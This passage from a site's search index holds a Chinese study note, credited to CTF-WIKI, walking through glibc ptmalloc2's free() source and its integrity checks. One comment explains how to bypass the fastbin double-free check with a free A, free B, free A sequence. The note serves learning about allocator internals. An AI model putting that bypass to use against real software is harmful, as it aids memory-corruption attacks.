DEFAULT_MMAP_THRESHOLD_MAX && !DUMPED_MAIN_ARENA_CHUNK(p)) { mp_.mmap_threshold = chunksize(p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE(memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); } munmap_chunk(p); return; } // \u6839\u636echunk\u83b7\u5f97\u5206\u914d\u533a\u7684\u6307\u9488 ar_ptr = arena_for_chunk(p); // \u6267\u884c\u91ca\u653e _int_free(ar_ptr, p, 0); } _int_free \u51fd\u6570\u521d\u59cb\u65f6\u523b\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u7684\u53d8\u91cf\uff0c\u5e76\u4e14\u5f97\u5230\u4e86\u7528\u6237\u60f3\u8981\u91ca\u653e\u7684 chunk \u7684\u5927\u5c0f static void _int_free(mstate av, mchunkptr p, int have_lock) { INTERNAL_SIZE_T size; /* its size */ mfastbinptr * fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ const char *errstr = NULL; int locked = 0; size = chunksize(p); \u7b80\u5355\u7684\u68c0\u67e5 /* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \"design\" from some intruder. */ // \u6307\u9488\u4e0d\u80fd\u6307\u5411\u975e\u6cd5\u7684\u5730\u5740, \u5fc5\u987b\u5c0f\u4e8e\u7b49\u4e8e-size\uff0c\u4e3a\u4ec0\u4e48\uff1f\uff1f\uff1f // \u6307\u9488\u5fc5\u987b\u5f97\u5bf9\u9f50\uff0c2*SIZE_SZ \u8fd9\u4e2a\u5bf9\u9f50\u5f97\u4ed4\u7ec6\u60f3\u60f3 if (__builtin_expect((uintptr_t) p > (uintptr_t) -size, 0) || __builtin_expect(misaligned_chunk(p), 0)) { errstr = \"free(): invalid pointer\"; errout: if (!have_lock && locked) __libc_lock_unlock(av->mutex); malloc_printerr(check_action, errstr, chunk2mem(p), av); return; } /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ // \u5927\u5c0f\u6ca1\u6709\u6700\u5c0f\u7684chunk\u5927\uff0c\u6216\u8005\u8bf4\uff0c\u5927\u5c0f\u4e0d\u662fMALLOC_ALIGNMENT\u7684\u6574\u6570\u500d if (__glibc_unlikely(size < MINSIZE || !aligned_OK(size))) { errstr = \"free(): invalid size\"; goto errout; } // \u68c0\u67e5\u8be5chunk\u662f\u5426\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_inuse_chunk(av, p); \u5176\u4e2d /* Check if m has acceptable alignment */ #define aligned_OK(m) (((unsigned long) (m) &MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) & \\ MALLOC_ALIGN_MASK) fast bin \u5982\u679c\u4e0a\u8ff0\u68c0\u67e5\u90fd\u5408\u683c\u7684\u8bdd\uff0c\u5224\u65ad\u5f53\u524d\u7684 bin \u662f\u4e0d\u662f\u5728 fast bin \u8303\u56f4\u5185\uff0c\u5728\u7684\u8bdd\u5c31\u63d2\u5165\u5230 fastbin \u5934\u90e8 \uff0c\u5373\u6210\u4e3a\u5bf9\u5e94 fastbin \u94fe\u8868\u7684 \u7b2c\u4e00\u4e2a free chunk \u3002 /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if ((unsigned long) (size) <= (unsigned long) (get_max_fast()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ //\u9ed8\u8ba4 #define TRIM_FASTBINS 0\uff0c\u56e0\u6b64\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0b\u9762\u7684\u8bed\u53e5\u4e0d\u4f1a\u6267\u884c // \u5982\u679c\u5f53\u524dchunk\u662ffast chunk\uff0c\u5e76\u4e14\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u5219\u4e0d\u80fd\u63d2\u5165 // \u56e0\u4e3a\u4e0b\u4e00\u4e2achunk\u662ftopchunk \u76f4\u63a5\u4e0e topchunk \u5408\u5e76 && (chunk_at_offset(p, size) != av->top) #endif ) { // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e\u4e24\u500d\u7684SIZE_SZ,\u5e76\u4e14 // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5927\u4e8esystem_mem\uff0c \u4e00\u822c\u4e3a132k // \u5982\u679c\u51fa\u73b0\u8fd9\u6837\u7684\u60c5\u51b5\uff0c\u5c31\u62a5\u9519\u3002 if (__builtin_expect( chunksize_nomask(chunk_at_offset(p, size)) <= 2 * SIZE_SZ, 0) || __builtin_expect( chunksize(chunk_at_offset(p, size)) >= av->system_mem, 0)) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if (have_lock || ({ assert(locked == 0); __libc_lock_lock(av->mutex); locked = 1; chunksize_nomask(chunk_at_offset(p, size)) <= 2 * SIZE_SZ || chunksize(chunk_at_offset(p, size)) >= av->system_mem; })) { errstr = \"free(): invalid next size (fast)\"; goto errout; } if (!have_lock) { __libc_lock_unlock(av->mutex); locked = 0; } } // \u5c06chunk\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte free_perturb(chunk2mem(p), size - 2 * SIZE_SZ); // \u8bbe\u7f6efast chunk\u7684\u6807\u8bb0\u4f4d set_fastchunks(av); // \u6839\u636e\u5927\u5c0f\u83b7\u53d6fast bin\u7684\u7d22\u5f15 unsigned int idx = fastbin_index(size); // \u83b7\u53d6\u5bf9\u5e94fastbin\u7684\u5934\u6307\u9488\uff0c\u88ab\u521d\u59cb\u5316\u540e\u4e3aNULL\u3002 fb = &fastbin(av, idx); /* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ // \u4f7f\u7528\u539f\u5b50\u64cd\u4f5c\u5c06P\u63d2\u5165\u5230\u94fe\u8868\u4e2d mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ // so we can not double free one fastbin chunk // \u9632\u6b62\u5bf9 fast bin double free // \u9632\u5fa1\u65b9\u6cd5\u662f\u901a\u8fc7\u68c0\u67e5\u4e0a\u4e00\u4e2achunk\u662f\u5426\u548c\u65b0\u91ca\u653e\u7684chunk\u5730\u5740\u76f8\u540c // \u7ed5\u8fc7\u65b9\u6cd5\u5c31\u662f\u5728\u4e2d\u95f4\u5939\u6742\u4e00\u4e2a\u5176\u4ed6chunk\uff0c\u6bd4\u5982\u9700\u8981doublefree A\uff0c\u91ca\u653e\u987a\u5e8f\u4e3a\uff1a // free A\u3001free B\u3001free A if (__builtin_expect(old == p, 0)) { errstr = \"double free or corruption (fasttop)\"; goto errout; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock && old != NULL) old_idx = fastbin_index(chunksize(old)); p->fd = old2 = old; } while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2); // \u786e\u4fddfast bin\u7684\u52a0\u5165\u524d\u4e0e\u52a0\u5165\u540e\u76f8\u540c if (have_lock && old != NULL && __builtin_expect(old_idx != idx, 0)) { errstr = \"invalid fastbin entry (free)\"; goto errout; } } \u5408\u5e76\u975e mmap \u7684\u7a7a\u95f2 chunk \u53ea\u6709\u4e0d\u662f fast bin \u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u89e6\u53d1 unlink \u9996\u5148\u6211\u4eec\u5148\u8bf4\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u4f1a\u5408\u5e76 chunk\uff0c\u8fd9\u662f\u4e3a\u4e86\u907f\u514d heap \u4e2d\u6709\u592a\u591a\u96f6\u96f6\u788e\u788e\u7684\u5185\u5b58\u5757\uff0c\u5408\u5e76\u4e4b\u540e\u53ef\u4ee5\u7528\u6765\u5e94\u5bf9\u66f4\u5927\u7684\u5185\u5b58\u5757\u8bf7\u6c42\u3002\u5408\u5e76\u7684\u4e3b\u8981\u987a\u5e8f\u4e3a \u5148\u8003\u8651\u7269\u7406\u4f4e\u5730\u5740\u7a7a\u95f2\u5757 \u540e\u8003\u8651\u7269\u7406\u9ad8\u5730\u5740\u7a7a\u95f2\u5757 \u5408\u5e76\u540e\u7684 chunk \u6307\u5411\u5408\u5e76\u7684 chunk \u7684\u4f4e\u5730\u5740\u3002 \u5728\u6ca1\u6709\u9501\u7684\u60c5\u51b5\u4e0b\uff0c\u5148\u83b7\u5f97\u9501\u3002 /* Consolidate other non-mmapped chunks as they arrive. */ else if (!chunk_is_mmapped(p)) { if (!have_lock) { __libc_lock_lock(av->mutex); locked = 1; } nextchunk = chunk_at_offset(p, size); \u8f7b\u91cf\u7ea7\u7684\u68c0\u6d4b /* Lightweight tests: check whether the block is already the top block. */ // \u5f53\u524dfree\u7684chunk\u4e0d\u80fd\u662ftop chunk if (__glibc_unlikely(p == av->top)) { errstr = \"double free or corruption (top)\"; goto errout; } // \u5f53\u524dfree\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u4e0d\u80fd\u8d85\u8fc7arena\u7684\u8fb9\u754c /* Or whether the next chunk is beyond the boundaries of the arena. */ if (__builtin_expect(contiguous(av) && (char *) nextchunk >= ((char *) av->top + chunksize(av->top)), 0)) { errstr = \"double free or corruption (out)\"; goto errout; } // \u5f53\u524d\u8981free\u7684chunk\u7684\u4f7f\u7528\u6807\u8bb0\u6ca1\u6709\u88ab\u6807\u8bb0\uff0cdouble free /* Or whether the block is actually not marked used. */ if (__glibc_unlikely(!prev_inuse(nextchunk))) { errstr = \"double free or corruption (!prev)\"; goto errout; } // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f nextsize = chunksize(nextchunk); // next chunk size valid check // \u5224\u65ad\u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u662f\u5426\u4e0d\u5927\u4e8e2*SIZE_SZ\uff0c\u6216\u8005 // nextsize\u662f\u5426\u5927\u4e8e\u7cfb\u7edf\u53ef\u63d0\u4f9b\u7684\u5185\u5b58 if (__builtin_expect(chunksize_nomask(nextchunk) <= 2 * SIZE_SZ, 0) || __builtin_expect(nextsize >= av->system_mem, 0)) { errstr = \"free(): invalid next size (normal)\"; goto errout; } \u91ca\u653e\u586b\u5145 //\u5c06\u6307\u9488\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte free_perturb(chunk2mem(p), size - 2 * SIZE_SZ); \u540e\u5411\u5408\u5e76 - \u5408\u5e76\u4f4e\u5730\u5740 chunk /* consolidate backward */ if (!prev_inuse(p)) { prevsize = prev_size(p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); } \u4e0b\u4e00\u5757\u4e0d\u662f top chunk - \u524d\u5411\u5408\u5e76 - \u5408\u5e76\u9ad8\u5730\u5740 chunk \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4e0b\u4e00\u5757\u4e0d\u662f top chunk \uff0c\u5219\u5408\u5e76\u9ad8\u5730\u5740\u7684 chunk \uff0c\u5e76\u5c06\u5408\u5e76\u540e\u7684 chunk \u653e\u5165\u5230 unsorted bin \u4e2d\u3002 // \u5982\u679c\u4e0b\u4e00\u4e2achunk\u4e0d\u662ftop chunk if (nextchunk != av->top) { /* get and clear inuse bit */ // \u83b7\u53d6\u4e0b\u4e00\u4e2a chunk \u7684\u4f7f\u7528\u72b6\u6001 nextinuse = inuse_bit_at_offset(nextchunk, nextsize); // \u5982\u679c\u4e0d\u5728\u4f7f\u7528\uff0c\u5408\u5e76\uff0c\u5426\u5219\u6e05\u7a7a\u5f53\u524dchunk\u7684\u4f7f\u7528\u72b6\u6001\u3002 /* consolidate forward */ if (!nextinuse) { unlink(av, nextchunk, bck, fwd); size += nextsize; } else clear_inuse_bit_at_offset(nextchunk, 0); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ // \u628a chunk \u653e\u5728 unsorted chunk \u94fe\u8868\u7684\u5934\u90e8 // unsorted bin \u94fe\u5934 bck = unsorted_chunks(av); // unsorted bin \u987a\u6570\u7b2c\u4e00\u4e2a\uff08\u6700\u65b0\u653e\u5165\uff09 fwd = bck->fd; // \u7b80\u5355\u7684\u68c0\u67e5 if (__glibc_unlikely(fwd->bk != bck)) { errstr = \"free(): corrupted unsorted chunks\"; goto errout; } p->fd = fwd; p->bk = bck; // \u5982\u679c\u662f large chunk\uff0c\u90a3\u5c31\u8bbe\u7f6enextsize\u6307\u9488\u5b57\u6bb5\u4e3aNULL\u3002 if (!in_smallbin_range(size)) { p->fd_nextsize = NULL; p->bk_nextsize = NULL; } bck->fd = p; fwd->bk = p; set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); } \u4e0b\u4e00\u5757\u662f top chunk - \u5408\u5e76\u5230 top chunk /* If the chunk borders the current high end of memory, consolidate into top */ // \u5982\u679c\u8981\u91ca\u653e\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u90a3\u5c31\u5408\u5e76\u5230 top chunk else { size += nextsize; set_head(p, size | PREV_INUSE); av->top = p; check_chunk(av, p); } \u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58 /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don't know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don't want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ // \u5982\u679c\u5408\u5e76\u540e\u7684 chunk \u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD // \u4e00\u822c\u5408\u5e76\u5230 top chunk \u90fd\u4f1a\u6267\u884c\u8fd9\u90e8\u5206\u4ee3\u7801\u3002 // \u90a3\u5c31\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58 if ((unsigned long) (size) >= FASTBIN_CONSOLIDATION_THRESHOLD) { // \u5982\u679c\u6709 fast chunk \u5c31\u8fdb\u884c\u5408\u5e76 if (have_fastchunks(av)) malloc_consolidate(av); // \u4e3b\u5206\u914d\u533a if (av == &main_arena) { #ifndef MORECORE_CANNOT_TRIM // top chunk \u5927\u4e8e\u5f53\u524d\u7684\u6536\u7f29\u9619\u503c if ((unsigned long) (chunksize(av->top)) >= (unsigned long) (mp_.trim_threshold)) systrim(mp_.top_pad, av); #endif // \u975e\u4e3b\u5206\u914d\u533a\uff0c\u5219\u76f4\u63a5\u6536\u7f29heap } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info *heap = heap_for_ptr(top(av)); assert(heap->ar_ptr == av); heap_trim(heap, mp_.top_pad); } } if (!have_lock) { assert(locked); __libc_lock_unlock(av->mutex); } \u91ca\u653e mmap \u7684 chunk } else { // If the chunk was allocated via mmap, release via munmap(). munmap_chunk(p); } systrim heap_trim munmap_chunk","title":"\u5185\u5b58\u5757\u91ca\u653e\u64cd\u4f5c"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#_1","text":"Free Heap Memory \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55","title":"\u91ca\u653e\u5185\u5b58\u5757"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#__libc_free","text":"\u7c7b\u4f3c\u4e8e malloc\uff0cfree \u51fd\u6570\u4e5f\u6709\u4e00\u5c42\u5c01\u88c5\uff0c\u547d\u540d\u683c\u5f0f\u4e0e malloc \u57fa\u672c\u7c7b\u4f3c\u3002\u4ee3\u7801\u5982\u4e0b void __libc_free(void *mem) { mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ // \u5224\u65ad\u662f\u5426\u6709\u94a9\u5b50\u51fd\u6570 __free_hook void (*hook)(void *, const void *) = atomic_forced_read(__free_hook); if (__builtin_expect(hook != NULL, 0)) { //\u6267\u884chook\u51fd\u6570\u7136\u540e\u8fd4\u56de (*hook)(mem, RETURN_ADDRESS(0)); return; } // free NULL\u6ca1\u6709\u4f5c\u7528 if (mem == 0) /* free(0) has no effect */ return; // \u5c06mem\u8f6c\u6362\u4e3achunk\u72b6\u6001 p = mem2chunk(mem); // \u5982\u679c\u8be5\u5757\u5185\u5b58\u662fmmap\u5f97\u5230\u7684 if (chunk_is_mmapped(p)) /* release mmapped memory. */ { /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if (!mp_.no_dyn_threshold && chunksize_nomask(p) > mp_.mmap_threshold && chunksize_nomask(p) <= DEFAULT_MMAP_THRESHOLD_MAX && !DUMPED_MAIN_ARENA_CHUNK(p)) { mp_.mmap_threshold = chunksize(p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE(memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); } munmap_chunk(p); return; } // \u6839\u636echunk\u83b7\u5f97\u5206\u914d\u533a\u7684\u6307\u9488 ar_ptr = arena_for_chunk(p); // \u6267\u884c\u91ca\u653e _int_free(ar_ptr, p, 0); }","title":"__libc_free"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#_int_free","text":"\u51fd\u6570\u521d\u59cb\u65f6\u523b\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u7684\u53d8\u91cf\uff0c\u5e76\u4e14\u5f97\u5230\u4e86\u7528\u6237\u60f3\u8981\u91ca\u653e\u7684 chunk \u7684\u5927\u5c0f static void _int_free(mstate av, mchunkptr p, int have_lock) { INTERNAL_SIZE_T size; /* its size */ mfastbinptr * fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ const char *errstr = NULL; int locked = 0; size = chunksize(p);","title":"_int_free"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#_2","text":"/* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \"design\" from some intruder. */ // \u6307\u9488\u4e0d\u80fd\u6307\u5411\u975e\u6cd5\u7684\u5730\u5740, \u5fc5\u987b\u5c0f\u4e8e\u7b49\u4e8e-size\uff0c\u4e3a\u4ec0\u4e48\uff1f\uff1f\uff1f // \u6307\u9488\u5fc5\u987b\u5f97\u5bf9\u9f50\uff0c2*SIZE_SZ \u8fd9\u4e2a\u5bf9\u9f50\u5f97\u4ed4\u7ec6\u60f3\u60f3 if (__builtin_expect((uintptr_t) p > (uintptr_t) -size, 0) || __builtin_expect(misaligned_chunk(p), 0)) { errstr = \"free(): invalid pointer\"; errout: if (!have_lock && locked) __libc_lock_unlock(av->mutex); malloc_printerr(check_action, errstr, chunk2mem(p), av); return; } /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ // \u5927\u5c0f\u6ca1\u6709\u6700\u5c0f\u7684chunk\u5927\uff0c\u6216\u8005\u8bf4\uff0c\u5927\u5c0f\u4e0d\u662fMALLOC_ALIGNMENT\u7684\u6574\u6570\u500d if (__glibc_unlikely(size < MINSIZE || !aligned_OK(size))) { errstr = \"free(): invalid size\"; goto errout; } // \u68c0\u67e5\u8be5chunk\u662f\u5426\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_inuse_chunk(av, p); \u5176\u4e2d /* Check if m has acceptable alignment */ #define aligned_OK(m) (((unsigned long) (m) &MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) & \\ MALLOC_ALIGN_MASK)","title":"\u7b80\u5355\u7684\u68c0\u67e5"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#fast-bin","text":"\u5982\u679c\u4e0a\u8ff0\u68c0\u67e5\u90fd\u5408\u683c\u7684\u8bdd\uff0c\u5224\u65ad\u5f53\u524d\u7684 bin \u662f\u4e0d\u662f\u5728 fast bin \u8303\u56f4\u5185\uff0c\u5728\u7684\u8bdd\u5c31\u63d2\u5165\u5230 fastbin \u5934\u90e8 \uff0c\u5373\u6210\u4e3a\u5bf9\u5e94 fastbin \u94fe\u8868\u7684 \u7b2c\u4e00\u4e2a free chunk \u3002 /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if ((unsigned long) (size) <= (unsigned long) (get_max_fast()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ //\u9ed8\u8ba4 #define TRIM_FASTBINS 0\uff0c\u56e0\u6b64\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0b\u9762\u7684\u8bed\u53e5\u4e0d\u4f1a\u6267\u884c // \u5982\u679c\u5f53\u524dchunk\u662ffast chunk\uff0c\u5e76\u4e14\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u5219\u4e0d\u80fd\u63d2\u5165 // \u56e0\u4e3a\u4e0b\u4e00\u4e2achunk\u662ftopchunk \u76f4\u63a5\u4e0e topchunk \u5408\u5e76 && (chunk_at_offset(p, size) != av->top) #endif ) { // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e\u4e24\u500d\u7684SIZE_SZ,\u5e76\u4e14 // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5927\u4e8esystem_mem\uff0c \u4e00\u822c\u4e3a132k // \u5982\u679c\u51fa\u73b0\u8fd9\u6837\u7684\u60c5\u51b5\uff0c\u5c31\u62a5\u9519\u3002 if (__builtin_expect( chunksize_nomask(chunk_at_offset(p, size)) <= 2 * SIZE_SZ, 0) || __builtin_expect( chunksize(chunk_at_offset(p, size)) >= av->system_mem, 0)) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if (have_lock || ({ assert(locked == 0); __libc_lock_lock(av->mutex); locked = 1; chunksize_nomask(chunk_at_offset(p, size)) <= 2 * SIZE_SZ || chunksize(chunk_at_offset(p, size)) >= av->system_mem; })) { errstr = \"free(): invalid next size (fast)\"; goto errout; } if (!have_lock) { __libc_lock_unlock(av->mutex); locked = 0; } } // \u5c06chunk\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte free_perturb(chunk2mem(p), size - 2 * SIZE_SZ); // \u8bbe\u7f6efast chunk\u7684\u6807\u8bb0\u4f4d set_fastchunks(av); // \u6839\u636e\u5927\u5c0f\u83b7\u53d6fast bin\u7684\u7d22\u5f15 unsigned int idx = fastbin_index(size); // \u83b7\u53d6\u5bf9\u5e94fastbin\u7684\u5934\u6307\u9488\uff0c\u88ab\u521d\u59cb\u5316\u540e\u4e3aNULL\u3002 fb = &fastbin(av, idx); /* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ // \u4f7f\u7528\u539f\u5b50\u64cd\u4f5c\u5c06P\u63d2\u5165\u5230\u94fe\u8868\u4e2d mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ // so we can not double free one fastbin chunk // \u9632\u6b62\u5bf9 fast bin double free // \u9632\u5fa1\u65b9\u6cd5\u662f\u901a\u8fc7\u68c0\u67e5\u4e0a\u4e00\u4e2achunk\u662f\u5426\u548c\u65b0\u91ca\u653e\u7684chunk\u5730\u5740\u76f8\u540c // \u7ed5\u8fc7\u65b9\u6cd5\u5c31\u662f\u5728\u4e2d\u95f4\u5939\u6742\u4e00\u4e2a\u5176\u4ed6chunk\uff0c\u6bd4\u5982\u9700\u8981doublefree A\uff0c\u91ca\u653e\u987a\u5e8f\u4e3a\uff1a // free A\u3001free B\u3001free A if (__builtin_expect(old == p, 0)) { errstr = \"double free or corruption (fasttop)\"; goto errout; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock && old != NULL) old_idx = fastbin_index(chunksize(old)); p->fd = old2 = old; } while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2); // \u786e\u4fddfast bin\u7684\u52a0\u5165\u524d\u4e0e\u52a0\u5165\u540e\u76f8\u540c if (have_lock && old != NULL && __builtin_expect(old_idx != idx, 0)) { errstr = \"invalid fastbin entry (free)\"; goto errout; } }","title":"fast bin"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#mmap-chunk","text":"\u53ea\u6709\u4e0d\u662f fast bin \u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u89e6\u53d1 unlink \u9996\u5148\u6211\u4eec\u5148\u8bf4\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u4f1a\u5408\u5e76 chunk\uff0c\u8fd9\u662f\u4e3a\u4e86\u907f\u514d heap \u4e2d\u6709\u592a\u591a\u96f6\u96f6\u788e\u788e\u7684\u5185\u5b58\u5757\uff0c\u5408\u5e76\u4e4b\u540e\u53ef\u4ee5\u7528\u6765\u5e94\u5bf9\u66f4\u5927\u7684\u5185\u5b58\u5757\u8bf7\u6c42\u3002\u5408\u5e76\u7684\u4e3b\u8981\u987a\u5e8f\u4e3a \u5148\u8003\u8651\u7269\u7406\u4f4e\u5730\u5740\u7a7a\u95f2\u5757 \u540e\u8003\u8651\u7269\u7406\u9ad8\u5730\u5740\u7a7a\u95f2\u5757 \u5408\u5e76\u540e\u7684 chunk \u6307\u5411\u5408\u5e76\u7684 chunk \u7684\u4f4e\u5730\u5740\u3002 \u5728\u6ca1\u6709\u9501\u7684\u60c5\u51b5\u4e0b\uff0c\u5148\u83b7\u5f97\u9501\u3002 /* Consolidate other non-mmapped chunks as they arrive. */ else if (!chunk_is_mmapped(p)) { if (!have_lock) { __libc_lock_lock(av->mutex); locked = 1; } nextchunk = chunk_at_offset(p, size);","title":"\u5408\u5e76\u975e mmap \u7684\u7a7a\u95f2 chunk"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#_3","text":"/* Lightweight tests: check whether the block is already the top block. */ // \u5f53\u524dfree\u7684chunk\u4e0d\u80fd\u662ftop chunk if (__glibc_unlikely(p == av->top)) { errstr = \"double free or corruption (top)\"; goto errout; } // \u5f53\u524dfree\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u4e0d\u80fd\u8d85\u8fc7arena\u7684\u8fb9\u754c /* Or whether the next chunk is beyond the boundaries of the arena. */ if (__builtin_expect(contiguous(av) && (char *) nextchunk >= ((char *) av->top + chunksize(av->top)), 0)) { errstr = \"double free or corruption (out)\"; goto errout; } // \u5f53\u524d\u8981free\u7684chunk\u7684\u4f7f\u7528\u6807\u8bb0\u6ca1\u6709\u88ab\u6807\u8bb0\uff0cdouble free /* Or whether the block is actually not marked used. */ if (__glibc_unlikely(!prev_inuse(nextchunk))) { errstr = \"double free or corruption (!prev)\"; goto errout; } // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f nextsize = chunksize(nextchunk); // next chunk size valid check // \u5224\u65ad\u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u662f\u5426\u4e0d\u5927\u4e8e2*SIZE_SZ\uff0c\u6216\u8005 // nextsize\u662f\u5426\u5927\u4e8e\u7cfb\u7edf\u53ef\u63d0\u4f9b\u7684\u5185\u5b58 if (__builtin_expect(chunksize_nomask(nextchunk) <= 2 * SIZE_SZ, 0) || __builtin_expect(nextsize >= av->system_mem, 0)) { errstr = \"free(): invalid next size (normal)\"; goto errout; }","title":"\u8f7b\u91cf\u7ea7\u7684\u68c0\u6d4b"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#_4","text":"//\u5c06\u6307\u9488\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);","title":"\u91ca\u653e\u586b\u5145"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#-chunk","text":"/* consolidate backward */ if (!prev_inuse(p)) { prevsize = prev_size(p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); }","title":"\u540e\u5411\u5408\u5e76 - \u5408\u5e76\u4f4e\u5730\u5740 chunk"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#top-chunk-chunk","text":"\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4e0b\u4e00\u5757\u4e0d\u662f top chunk \uff0c\u5219\u5408\u5e76\u9ad8\u5730\u5740\u7684 chunk \uff0c\u5e76\u5c06\u5408\u5e76\u540e\u7684 chunk \u653e\u5165\u5230 unsorted bin \u4e2d\u3002 // 